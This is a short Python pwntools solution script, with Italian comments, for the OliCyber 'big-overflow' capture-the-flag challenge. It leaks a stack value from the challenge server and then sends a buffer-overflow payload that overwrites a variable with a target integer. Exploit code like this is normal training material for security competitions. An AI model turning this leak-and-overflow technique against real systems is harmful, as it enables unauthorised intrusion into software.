from pwn import *

def main():

    conn = remote('big-overflow.challs.olicyber.it', 34003)
    
    # 1. Leak del canary
    conn.recvuntil(b"Hello, what's your name?\n")
    
    conn.send(b'A' * 32)  # Riempie il buffer
    
    response = conn.recvuntil(b"but I don't think it's right.")  
    
    print(f'response: {response}')
    stream = response[40:].replace(b"but I don't think it's right.", b'')
    print(f'stream: {stream}')
    stream = u64(stream.ljust(8, b'\x00'))
    print(f'stream: {hex(stream)}')
    
    v7_value = 95099824           # Valore target
    payload = b'A' * 32           # Riempie il buffer (32 byte)
    payload += p64(stream)        # Riempie Pointer 
    payload += p32(v7_value)     # Sovrascrive v7 con `p32` per un integer a 32 bit
    print(f'payload: {payload}')
    
    # 3. Invio del payload
    conn.recvuntil(b"Tell me again please: ")
    conn.sendline(payload)

    response = conn.recvall()
    print(response.decode())

if __name__ == "__main__":
    main()